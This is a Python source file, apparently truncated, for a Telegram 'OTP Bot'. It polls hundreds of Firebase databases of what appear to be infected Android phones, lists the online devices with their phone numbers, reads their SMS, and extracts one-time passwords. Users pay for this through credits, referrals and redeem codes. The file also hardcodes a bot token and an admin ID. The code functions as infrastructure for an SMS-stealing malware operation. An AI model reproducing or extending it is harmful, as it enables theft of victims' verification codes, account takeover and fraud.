#!/usr/bin/env python3
"""
Firebase SMS Dashboard Bot — FINAL (300 FBs + Bulk Delete + 120m SMS Filter)
"""

import os
import re
import json
import time
import asyncio
import logging
import gc
import random
import zipfile
import io
from html import escape as html_escape
from collections import Counter
from datetime import datetime
from typing import Optional, Dict, List, Tuple, Set

import aiohttp
from telegram import (
    Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup,
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    filters, ContextTypes,
)

BOT_TOKEN = "9013895247:AAG9_5_buuj3yZF6-MIpVuJRoKIxF4kdTeE"
ADMIN_IDS = [1885926472]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger("FirebaseSMSBot")

# ============================================================
# CONSTANTS
# ============================================================
FB_REQUEST_TIMEOUT = 10
FB_RETRY_MAX = 1
FB_RETRY_BACKOFF = 1.2
FB_CLIENTS_MAX_BYTES = 50 * 1024 * 1024
FB_MESSAGES_LIMIT = 5
MAX_FIREBASES = 300
CLEANUP_INTERVAL = 60
SMS_MONITOR_INTERVAL = 1
SMS_MONITOR_DURATION = 300
SMS_MONITOR_IDLE_TIMEOUT = 600
ADMIN_PANEL_EDIT_INTERVAL = 5
WELCOME_IMAGE_URL = "https://i.ibb.co/CK3s8vzR/Gemini-Generated-Image-en17gcen17gcen17.png"

REFERRAL_CREDITS = 10
CREDITS_PER_GENERATE = 1
DAILY_BONUS_CREDITS = 0
SMS_RECENT_WINDOW = 7200 # 120 minutes in seconds

FORCE_JOIN_FILE = os.getenv("FORCE_JOIN_FILE", "force_join_channels.json")
USER_IDS_FILE = os.getenv("USER_IDS_FILE", "bot_users.json")
MAINTENANCE_FILE = os.getenv("MAINTENANCE_FILE", "maintenance_mode.json")
GLOBAL_FB_FILE = os.getenv("GLOBAL_FB_FILE", "global_firebases.json")
GLOBAL_DEVICE_CACHE_FILE = os.getenv("GLOBAL_DEVICE_CACHE_FILE", "global_devices_cache.json")
CAPTCHA_STATE_FILE = os.getenv("CAPTCHA_STATE_FILE", "captcha_state.json")
REFERRAL_DB_FILE = os.getenv("REFERRAL_DB_FILE", "referrals.json")
BOT_CONFIG_FILE = os.getenv("BOT_CONFIG_FILE", "bot_config.json")
REDEEM_CODES_FILE = os.getenv("REDEEM_CODES_FILE", "redeem_codes.json")

ACCESS_CHECK_INTERVAL = 30
ADMIN_DEVICE_REFRESH_INTERVAL = 180

DEFAULT_CHANNELS = []

# ============================================================
# FILE HELPERS
# ============================================================
def _load_required_channels():
    try:
        with open(FORCE_JOIN_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if isinstance(saved, list):
            return [item for item in saved if isinstance(item, dict) and item.get("id")]
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return list(DEFAULT_CHANNELS)


def _save_required_channels():
    try:
        with open(FORCE_JOIN_FILE, "w", encoding="utf-8") as fh:
            json.dump(REQUIRED_CHANNELS, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save force-join channels: %s", exc)


def _load_user_ids():
    try:
        with open(USER_IDS_FILE, "r", encoding="utf-8") as fh:
            values = json.load(fh)
        return {int(value) for value in values}
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError, ValueError):
        return set()


def _save_user_ids():
    try:
        with open(USER_IDS_FILE, "w", encoding="utf-8") as fh:
            json.dump(sorted(known_users), fh)
    except OSError as exc:
        logger.warning("could not save user ids: %s", exc)


def _load_maintenance_mode() -> bool:
    try:
        with open(MAINTENANCE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        return bool(saved.get("enabled", False)) if isinstance(saved, dict) else bool(saved)
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return False


def _save_maintenance_mode():
    try:
        with open(MAINTENANCE_FILE, "w", encoding="utf-8") as fh:
            json.dump({"enabled": maintenance_mode}, fh)
    except OSError as exc:
        logger.warning("could not save maintenance mode: %s", exc)


def _load_captcha_enabled() -> bool:
    try:
        with open(CAPTCHA_STATE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        return bool(saved.get("enabled", True)) if isinstance(saved, dict) else True
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return True


def _save_captcha_enabled():
    try:
        with open(CAPTCHA_STATE_FILE, "w", encoding="utf-8") as fh:
            json.dump({"enabled": captcha_enabled}, fh)
    except OSError as exc:
        logger.warning("could not save captcha state: %s", exc)


def _load_global_firebases():
    try:
        with open(GLOBAL_FB_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if not isinstance(saved, list):
            return []
        out = []
        for i, item in enumerate(saved):
            if isinstance(item, dict) and item.get("url"):
                u = str(item["url"]).strip().rstrip("/")
                while u.endswith(".json"):
                    u = u[:-5].rstrip("/")
                if "firebaseio.com" in u or "firebasedatabase.app" in u:
                    tag = str(item.get("tag") or f"FB{i + 1}")
                    out.append((u, tag))
        return out
    except Exception:
        return []


def _save_global_firebases():
    try:
        payload = [{"url": url, "tag": tag} for url, tag in global_fb_list]
        with open(GLOBAL_FB_FILE, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save global firebases: %s", exc)


def _retag_global_firebases():
    global global_fb_list
    global_fb_list = [(url, f"FB{i + 1}") for i, (url, _) in enumerate(global_fb_list)]


def _load_bot_config():
    global REFERRAL_CREDITS, DAILY_BONUS_CREDITS
    try:
        with open(BOT_CONFIG_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
            REFERRAL_CREDITS = int(data.get("referral_credits", 10))
            DAILY_BONUS_CREDITS = int(data.get("daily_bonus_credits", 0))
    except Exception:
        pass

def _save_bot_config():
    try:
        with open(BOT_CONFIG_FILE, "w", encoding="utf-8") as fh:
            json.dump({
                "referral_credits": REFERRAL_CREDITS,
                "daily_bonus_credits": DAILY_BONUS_CREDITS
            }, fh)
    except Exception as e:
        logger.warning("could not save bot config: %s", e)

def _load_redeem_codes():
    global REDEEM_CODES_DB
    try:
        with open(REDEEM_CODES_FILE, "r", encoding="utf-8") as fh:
            REDEEM_CODES_DB = json.load(fh)
    except Exception:
        REDEEM_CODES_DB = {}

def _save_redeem_codes():
    try:
        with open(REDEEM_CODES_FILE, "w", encoding="utf-8") as fh:
            json.dump(REDEEM_CODES_DB, fh, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.warning("could not save redeem codes: %s", e)


# ============================================================
# GLOBAL STATE
# ============================================================
REQUIRED_CHANNELS = _load_required_channels()
maintenance_mode = _load_maintenance_mode()
captcha_enabled = _load_captcha_enabled()
global_fb_list = _load_global_firebases()
_last_refresh_time: float = time.monotonic()
_load_bot_config()

known_users = _load_user_ids()
user_access_state: Dict[int, bool] = {}
verified_access_users: Set[int] = set()
_referral_lock = asyncio.Lock()

def _load_referral_db() -> Dict[str, dict]:
    try:
        with open(REFERRAL_DB_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, dict):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return {}


def _save_referral_db():
    try:
        with open(REFERRAL_DB_FILE, "w", encoding="utf-8") as fh:
            json.dump(REFERRAL_DB, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save referral db: %s", exc)


REFERRAL_DB: Dict[str, dict] = _load_referral_db()
REDEEM_CODES_DB = {}
_load_redeem_codes()

_PHONE_PATTERNS = [
    re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'),
    re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE),
    re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
]

# ============================================================
# REFERRAL HELPERS
# ============================================================
def _ensure_user_record(user_id: int) -> dict:
    uid = str(user_id)
    if uid not in REFERRAL_DB:
        REFERRAL_DB[uid] = {
            "credits": 0,
            "referrals": [],
            "referred_by": None,
            "referral_count": 0,
            "captcha_verified": False,
            "suspended": False,
            "last_daily_bonus": 0,
            "is_blocked": False,
        }
    else:
        rec = REFERRAL_DB[uid]
        rec.setdefault("credits", 0)
        rec.setdefault("referrals", [])
        rec.setdefault("referred_by", None)
        rec.setdefault("referral_count", len(rec.get("referrals", [])))
        rec.setdefault("captcha_verified", False)
        rec.setdefault("suspended", False)
        rec.setdefault("last_daily_bonus", 0)
        rec.setdefault("is_blocked", False)
    return REFERRAL_DB[uid]


async def process_referral(referrer_id: int, referred_id: int) -> dict:
    async with _referral_lock:
        if referrer_id == referred_id: return {"success": False, "reason": "self_referral"}
        if referrer_id in ADMIN_IDS: return {"success": False, "reason": "admin_referrer"}
        if str(referrer_id) not in REFERRAL_DB: return {"success": False, "reason": "invalid_referrer"}
        
        ref_rec = _ensure_user_record(referrer_id)
        new_rec = _ensure_user_record(referred_id)
        
        if new_rec.get("referred_by") is not None: return {"success": False, "reason": "already_referred"}
        if referred_id in ref_rec.get("referrals", []): return {"success": False, "reason": "duplicate"}
        
        ref_rec["credits"] += REFERRAL_CREDITS
        ref_rec.setdefault("referrals", []).append(referred_id)
        ref_rec["referral_count"] = len(ref_rec["referrals"])
        
        new_rec["referred_by"] = referrer_id
        new_rec["credits"] += 1
        
        _save_referral_db()
        return {"success": True, "reason": "ok", "referrer_credits": ref_rec["credits"], "credits_given": REFERRAL_CREDITS}

# ============================================================
# FIREBASE HELPERS
# ============================================================
def normalize_fb_url(url: str) -> Optional[str]:
    try:
        if not url or not isinstance(url, str): return None
        u = url.replace("<u>", "").replace("</u>", "").strip()
        if not u.startswith("http"): return None
        if "firebaseio.com" not in u and "firebasedatabase.app" not in u: return None
        u = u.rstrip("/")
        while u.endswith(".json"): u = u[:-5].rstrip("/")
        return u
    except Exception: return None


def _load_global_device_cache():
    try:
        with open(GLOBAL_DEVICE_CACHE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if not isinstance(saved, dict) or not isinstance(saved.get("devices"), dict):
            return {"devices": {}, "online_count": 0, "offline_count": 0, "per_fb": {}, "updated_at": ""}
        if "per_fb" not in saved: saved["per_fb"] = {}
        return saved
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return {"devices": {}, "online_count": 0, "offline_count": 0, "per_fb": {}, "updated_at": ""}


def _save_global_device_cache(cache):
    try:
        tmp = f"{GLOBAL_DEVICE_CACHE_FILE}.tmp"
        with open(tmp, "w", encoding="utf-8") as fh: json.dump(cache, fh, ensure_ascii=False)
        os.replace(tmp, GLOBAL_DEVICE_CACHE_FILE)
    except OSError as exc: logger.warning("could not save device cache: %s", exc)


global_device_cache = _load_global_device_cache()


def fb_host_short(url: str) -> str:
    try:
        s = url.replace("https://", "").replace("http://", "")
        s = s.replace(".firebaseio.com", "").replace(".firebasedatabase.app", "")
        return s.split(".")[0][:30]
    except Exception: return url[:30]


def build_fb_endpoint(base_url: str, path: str = "", query: str = "") -> str:
    base = base_url.rstrip("/"); p = (path or "").strip("/"); q = (query or "").strip().lstrip("?")
    url = f"{base}/{p}/.json" if p else f"{base}/.json"
    if q: url += f"?{q}"
    return url


async def fb_get_json(session, url, *, timeout=FB_REQUEST_TIMEOUT, max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX):
    last_err = ""
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                status = resp.status
                if status == 413: return None, "TOO_LARGE", "HTTP 413"
                cl = resp.headers.get("Content-Length")
                if cl and cl.isdigit() and int(cl) > max_bytes: return None, "TOO_LARGE", f"CL {cl}"
                body = b""
                async for chunk in resp.content.iter_chunked(8192):
                    body += chunk
                    if len(body) > max_bytes: return None, "TOO_LARGE", "too big"
                text = body.decode("utf-8", errors="ignore").strip()
                if status in (401, 403): return None, "ACCESS_DENIED", f"HTTP {status}"
                if status == 404: return None, "NOT_FOUND", "HTTP 404"
                if status in (408, 504):
                    last_err = f"HTTP {status}"
                    if attempt < retries: await asyncio.sleep(FB_RETRY_BACKOFF ** attempt); continue
                    return None, "TIMEOUT", last_err
                if status == 429 or 500 <= status < 600:
                    last_err = f"HTTP {status}"
                    if attempt < retries: await asyncio.sleep(FB_RETRY_BACKOFF ** attempt); continue
                    return None, "HTTP_ERROR", last_err
                if status >= 400: return None, "HTTP_ERROR", f"HTTP {status}"
                if not text or text == "null": return None, "EMPTY_DATA", "null/empty"
                try: data = json.loads(text)
                except json.JSONDecodeError: return None, "INVALID_JSON", "json decode"
                if data is None: return None, "EMPTY_DATA", "null"
                return data, "SUCCESS", ""
        except asyncio.TimeoutError:
            last_err = "timeout"
            if attempt < retries: await asyncio.sleep(FB_RETRY_BACKOFF ** attempt); continue
            return None, "TIMEOUT", last_err
        except aiohttp.ClientConnectorError: return None, "DNS_ERROR", "host not found"
        except aiohttp.ClientError as e:
            last_err = f"{type(e).__name__}"
            if attempt < retries: await asyncio.sleep(FB_RETRY_BACKOFF ** attempt); continue
            return None, "CONNECTION_ERROR", last_err
        except Exception as e: return None, "OTHER_ERROR", str(e)[:80]
    return None, "OTHER_ERROR", last_err or "retries exhausted"


def _get_device_name(info, cid):
    if not isinstance(info, dict): return cid
    for key in ("modelName", "model", "deviceName", "name"):
        v = info.get(key)
        if v and str(v).strip() and str(v) != "-": return str(v).strip()
    return cid


def _get_mob_no(info):
    if not isinstance(info, dict): return ""
    raw = (info.get("mobNo") or info.get("mob_no") or info.get("mobile") or info.get("phoneNumber") or info.get("phone") or "")
    if not raw: return ""
    digits = re.sub(r"\D", "", str(raw))
    if len(digits) == 12 and digits.startswith("91"): digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0"): digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789": return digits
    return ""


def _newest_messages(msgs, limit=FB_MESSAGES_LIMIT):
    if not isinstance(msgs, dict): return []
    try: keys = sorted(msgs.keys(), key=lambda x: int(x), reverse=True)
    except (TypeError, ValueError): keys = list(msgs.keys())[::-1]
    return [msgs[k] for k in keys[:limit] if isinstance(msgs.get(k), dict)]


def _newest_with_keys(msgs, limit=FB_MESSAGES_LIMIT):
    if isinstance(msgs, list):
        out = []
        for i, value in list(enumerate(msgs))[-limit:][::-1]:
            if isinstance(value, dict): out.append((str(i), value))
        return out
    if not isinstance(msgs, dict): return []

    def _sort_token(k):
        s = str(k)
        try: return (0, int(s), "")
        except (TypeError, ValueError): return (1, 0, s)

    keys = sorted(msgs.keys(), key=_sort_token, reverse=True)
    out = []
    for k in keys[:limit]:
        v = msgs.get(k)
        if isinstance(v, dict): out.append((str(k), v))
    return out


def _extract_msg_body(m: dict) -> str:
    if not isinstance(m, dict): return ""
    for key in ("body", "message", "msg", "text", "content", "sms", "smsBody", "messageBody", "SMS", "msgBody"):
        v = m.get(key)
        if v is not None and str(v).strip(): return str(v).strip()
    return ""


def _extract_msg_sender(m: dict) -> str:
    if not isinstance(m, dict): return "Unknown"
    for key in ("sender", "from", "address", "number", "phone", "phoneNumber", "mobile", "mobNo", "src", "originator", "senderNumber", "fromNumber"):
        v = m.get(key)
        if v is not None and str(v).strip(): return str(v).strip()
    return "Unknown"


def _extract_msg_time(m: dict, fallback_key: str = "") -> str:
    if isinstance(m, dict):
        for key in ("time", "timestamp", "date", "receivedTime", "received_at", "sentTime", "dateTime", "createdAt"):
            v = m.get(key)
            if v is not None and str(v).strip(): return _format_time(v)
    if fallback_key: return _format_time(fallback_key)
    return "Unknown"


def _extract_otp(body: str) -> Optional[str]:
    if not body: return None
    text = str(body).replace("\u200b", " ").replace("\u00a0", " ")
    patterns = [
        r'\b(?:OTP|code|verification|verify|login|passcode)\D{0,20}(\d{4,8})\b',
        r'\b(\d{4,8})\b(?:\D{0,20})(?:OTP|code|verification|verify|login)\b',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            try:
                candidate = match.group(1)
                if candidate and candidate.isdigit() and 4 <= len(candidate) <= 8: return candidate
            except: pass
    return None


def _otp_short_message(sender: str, body: str) -> str:
    parts = [part for part in re.split(r"[-_\s]+", str(sender)) if part]
    brand = "SMS"
    for part in parts:
        p = part.strip()
        if len(p) >= 3 and p.upper() not in ("S", "VM", "MSG", "SMS"): brand = p; break
    return f"{brand.title()} login code received."


def _extract_number(sender: str) -> str:
    if not sender: return ""
    digits = re.sub(r'\D', '', sender)
    if len(digits) >= 10: return digits[-10:]
    return ""


def extract_phone_from_messages(msgs) -> Optional[str]:
    try:
        if not isinstance(msgs, dict): return None
        counts = Counter()
        for m in _newest_messages(msgs, limit=15):
            if not isinstance(m, dict): continue
            text = _extract_msg_body(m)
            for pat in _PHONE_PATTERNS:
                for num in pat.findall(text):
                    d = re.sub(r'\D', '', num)
                    if len(d) == 10 and d[0] in '6789': counts[d] += 1
                    elif len(d) == 12 and d.startswith('91') and d[2] in '6789': counts[d[2:]] += 1
        return counts.most_common(1)[0][0] if counts else None
    except Exception: return None


def get_last_sms_time(msgs) -> float:
    """Returns the timestamp of the newest message in the messages dict."""
    if not isinstance(msgs, dict) or not msgs: return 0.0
    best = 0.0
    for k, m in msgs.items():
        if not isinstance(m, dict): continue
        cand = 0.0
        for tf in ("time", "timestamp", "receivedTime", "sentTime", "dateTime", "createdAt"):
            v = m.get(tf)
            if v is None: continue
            try:
                n = float(str(v).strip())
                if n > 10**12: n /= 1000
                elif n < 10**9: n = 0
                cand = max(cand, n)
            except: pass
        if cand == 0:
            try:
                n = float(str(k).strip())
                if n > 10**12: n /= 1000
                elif n < 10**9: n = 0
                cand = n
            except: pass
        best = max(best, cand)
    return best


# ============================================================
# FIREBASE FETCH
# ============================================================
async def _try_fetch_clients(session, fb_url: str):
    data, status, _ = await fb_get_json(session, build_fb_endpoint(fb_url, ""))
    if status == "SUCCESS" and isinstance(data, dict):
        clients = None
        if isinstance(data.get("clients"), dict): clients = data["clients"]
        elif isinstance(data.get("devices"), dict): clients = data["devices"]
        messages = data.get("messages") if isinstance(data.get("messages"), dict) else {}
        if isinstance(clients, dict) and clients: return clients, messages
    (cdata, cst, _), (ddata, dst, _) = await asyncio.gather(
        fb_get_json(session, build_fb_endpoint(fb_url, "clients"), max_bytes=FB_CLIENTS_MAX_BYTES, retries=0),
        fb_get_json(session, build_fb_endpoint(fb_url, "devices"), max_bytes=FB_CLIENTS_MAX_BYTES, retries=0),
    )
    if cst == "SUCCESS" and isinstance(cdata, dict) and cdata: return cdata, {}
    if dst == "SUCCESS" and isinstance(ddata, dict) and ddata: return ddata, {}
    return {}, {}


async def fetch_devices_from_one(fb_url: str, fb_tag: str, only_online: bool = True, prefetched=None) -> Dict[str, dict]:
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    result = {}
    try:
        clients, messages_node = prefetched or await _try_fetch_clients(session, fb_url)
        if not clients: return {}
        phone_lookups = {}
        lookup_ids = [
            str(cid) for cid, info in clients.items()
            if isinstance(info, dict) and (not only_online or info.get("status") is True)
            and not _get_mob_no(info) and not isinstance(messages_node.get(cid), dict)
        ][:50]
        if lookup_ids:
            lookup_results = await asyncio.gather(*[
                _fetch_phone_lookup(session, fb_url, cid) for cid in lookup_ids
            ], return_exceptions=True)
            phone_lookups = {cid: phone for result in lookup_results if isinstance(result, tuple) for cid, phone in [result] if phone}
        
        for cid, info in clients.items():
            try:
                if not isinstance(info, dict): continue
                is_online = info.get("status") is True
                if only_online and not is_online: continue
                if not only_online and is_online: continue
                
                phone = _get_mob_no(info)
                m_data = messages_node.get(cid) if isinstance(messages_node, dict) else None
                
                if not phone:
                    if not isinstance(m_data, dict):
                        ext = phone_lookups.get(str(cid))
                        if ext: phone = ext
                    if isinstance(m_data, dict) and m_data:
                        ext = extract_phone_from_messages(m_data)
                        if ext: phone = ext
                
                if not phone: continue
                
                last_sms_time = 0.0
                if isinstance(m_data, dict) and m_data:
                    last_sms_time = get_last_sms_time(m_data)
                
                prefixed_id = f"{fb_tag}|{cid}"
                result[prefixed_id] = {
                    "name": _get_device_name(info, cid), "phone": phone, "raw": info,
                    "online": is_online, "fb_url": fb_url, "fb_tag": fb_tag,
                    "real_cid": cid, "last_sms_time": last_sms_time
                }
            except Exception: continue
        return result
    finally:
        try: await session.close()
        except: pass

async def _fetch_phone_lookup(session, fb_url: str, cid: str):
    try:
        murl = build_fb_endpoint(fb_url, f"messages/{cid}", query='orderBy="$key"&limitToLast=15')
        fetched, status, _ = await fb_get_json(session, murl, max_bytes=FB_CLIENTS_MAX_BYTES, timeout=min(FB_REQUEST_TIMEOUT, 4), retries=0)
        if status == "SUCCESS" and isinstance(fetched, dict): return cid, extract_phone_from_messages(fetched)
    except: pass
    return cid, None


async def fetch_counts_from_one(fb_url: str, fb_tag: str, prefetched=None) -> Tuple[int, int]:
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    online = 0; offline = 0
    try:
        clients, _ = prefetched or await _try_fetch_clients(session, fb_url)
        if not clients: return 0, 0
        for cid, info in clients.items():
            try:
                if not isinstance(info, dict): continue
                if info.get("status") is True: online += 1
                else: offline += 1
            except: continue
        return online, offline
    finally:
        try: await session.close()
        except: pass


async def fetch_counts_all_firebases(fb_list: List[tuple], prefetched=None) -> Tuple[int, int, Dict[str, dict]]:
    prefetched = prefetched or {}
    tasks = [fetch_counts_from_one(url, tag, prefetched=prefetched.get(url)) for url, tag in fb_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total_online = 0; total_offline = 0
    per_fb: Dict[str, dict] = {}
    for (url, tag), r in zip(fb_list, results):
        if isinstance(r, Exception) or not r: per_fb[tag] = {"online": 0, "offline": 0}; continue
        per_fb[tag] = {"online": r[0], "offline": r[1]}
        total_online += r[0]; total_offline += r[1]
    return total_online, total_offline, per_fb


async def fetch_devices_all_firebases(fb_list: List[tuple], only_online: bool = True, max_per_fb: int = 100, prefetched=None) -> Dict[str, dict]:
    prefetched = prefetched or {}
    tasks = [fetch_devices_from_one(url, tag, only_online, prefetched=prefetched.get(url)) for url, tag in fb_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    merged = {}
    for r in results:
        if isinstance(r, Exception) or not r: continue
        for k, v in list(r.items())[:max_per_fb]: merged[k] = v
    return merged


async def refresh_global_device_cache():
    global global_device_cache, _last_refresh_time
    if not global_fb_list:
        global_device_cache = {"devices": {}, "online_count": 0, "offline_count": 0, "per_fb": {}, "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        _save_global_device_cache(global_device_cache); _last_refresh_time = time.monotonic(); return global_device_cache
    try:
        devices_task = fetch_devices_all_firebases(global_fb_list, only_online=True, max_per_fb=150)
        counts_task = fetch_counts_all_firebases(global_fb_list)
        devices, (online_count, offline_count, per_fb) = await asyncio.gather(devices_task, counts_task)
        global_device_cache = {
            "devices": devices or {}, "online_count": len(devices or {}), "raw_online_count": online_count,
            "offline_count": offline_count, "per_fb": per_fb or {}, "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        _save_global_device_cache(global_device_cache); _last_refresh_time = time.monotonic()
    except Exception as exc: logger.error("global device cache refresh failed: %s", exc)
    return global_device_cache


async def _global_device_refresh_loop():
    global _last_refresh_time
    while True:
        try:
            await refresh_global_device_cache()
            _last_refresh_time = time.monotonic()
            await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)
        except asyncio.CancelledError: raise
        except Exception as exc:
            logger.error("global device refresh loop: %s", exc)
            await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)


async def fetch_last_sms(fb_url: str, device_id: str, limit: int = FB_MESSAGES_LIMIT):
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    try:
        url = build_fb_endpoint(fb_url, f"messages/{device_id}", query=f'orderBy="$key"&limitToLast={limit}')
        data, status, _ = await fb_get_json(session, url)
        if status == "SUCCESS" and isinstance(data, (dict, list)): return _newest_with_keys(data, limit=limit)
        url = build_fb_endpoint(fb_url, f"messages/{device_id}")
        data, status, _ = await fb_get_json(session, url)
        if status != "SUCCESS" or not isinstance(data, (dict, list)): return []
        return _newest_with_keys(data, limit=limit)
    finally:
        try: await session.close()
        except: pass

# ============================================================
# SESSION STORE
# ============================================================
user_sessions: Dict[int, dict] = {}
sms_monitor_tasks: Dict[int, asyncio.Task] = {}
sms_monitor_state: Dict[int, dict] = {}
admin_panel_live_tasks: Dict[int, asyncio.Task] = {}
bot_instance: Optional[Bot] = None
BOT_USERNAME: str = "REALSPYWEBBPT"

# ============================================================
# FORCE JOIN HELPERS
# ============================================================
def _is_member_status(status: str) -> bool:
    return status in {"member", "administrator", "creator"}


async def get_unjoined_channels(bot, user_id: int) -> List[dict]:
    unjoined = []
    if user_id in ADMIN_IDS: return unjoined
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if not _is_member_status(member.status): unjoined.append(channel)
        except Exception: unjoined.append(channel)
    return unjoined


async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS or not REQUIRED_CHANNELS: return True
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if not _is_member_status(member.status): return False
        except Exception as e:
            logger.warning(f"Force join error for {channel['id']}: {e}"); continue
    return True


async def _check_required_channels(bot, uid: int):
    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=uid)
            if not _is_member_status(member.status): missing.append(channel["label"])
        except Exception as exc:
            logger.warning("force join check failed for %s: %s", channel["id"], exc); missing.append(channel["label"])
    return not missing, missing


def build_dynamic_force_join_keyboard(unjoined_channels: List[dict]) -> InlineKeyboardMarkup:
    rows: List[List[InlineKeyboardButton]] = []
    styles = ["danger", "primary", "danger", "primary"]
    for i, c in enumerate(unjoined_channels):
        style = styles[i % len(styles)]
        try: btn = InlineKeyboardButton(text=f"𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:25]}", url=c["url"], api_kwargs={"style": style})
        except TypeError: btn = InlineKeyboardButton(text=f"𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:25]}", url=c["url"])
        rows.append([btn])
    try: check_btn = InlineKeyboardButton(text="✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣", callback_data="force_verify", api_kwargs={"style": "success"})
    except TypeError: check_btn = InlineKeyboardButton(text="✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣", callback_data="force_verify")
    rows.append([check_btn])
    return InlineKeyboardMarkup(rows)


def _force_join_kb():
    rows = []
    for channel in REQUIRED_CHANNELS:
        if channel.get("url"):
            try: rows.append([InlineKeyboardButton(f"🔗 𝗝𝗢𝗜𝗡 {channel['label']}", url=channel["url"], api_kwargs={"style": "primary"})])
            except TypeError: rows.append([InlineKeyboardButton(f"🔗 𝗝𝗢𝗜𝗡 {channel['label']}", url=channel["url"])])
    rows.append([styled_button("✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡", "force_verify", "success")])
    return InlineKeyboardMarkup(rows)


def build_forcejoin_caption(first_name: str = "User") -> str:
    return (f"🔗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗\n\n👋 Hi {first_name}!\n\nJoin all channels below, then tap\n✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣")


def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
    safe_name = (first_name or "User").strip()
    refer_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    credits = "Unlimited ♾️" if user_id in ADMIN_IDS else str(_ensure_user_record(user_id).get("credits", 0))
    ref_count = _ensure_user_record(user_id).get("referral_count", 0)
    return (f"🌸 𝗛𝗶𝗶 {safe_name} ⚡\n\n"
            "🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗢𝗧𝗣 𝗕𝗼𝘁 ✴️\n\n"
            f"💳 𝗬𝗢𝗨𝗥 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 : {credits}\n"
            f"💰 𝗣𝗘𝗥 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 : 1 𝗖𝗥𝗘𝗗𝗜𝗧\n\n"
            f"🔗 𝗬𝗢𝗨𝗥 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗟𝗜𝗡𝗞 :\n<code>{refer_link}</code>\n\n"
            f"📊 𝗧𝗢𝗧𝗔𝗟 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟𝗦 : {ref_count}\n\n"
            f"🎁 𝟭 𝗥𝗘𝗙𝗘𝗥 = {REFERRAL_CREDITS} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦\n\n"
            "👇 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁")


def _new_math_captcha():
    a, b = random.randint(2, 20), random.randint(2, 20)
    op = random.choice(("+", "-", "×"))
    return f"{a} {op} {b}", (a + b if op == "+" else a - b if op == "-" else a * b)


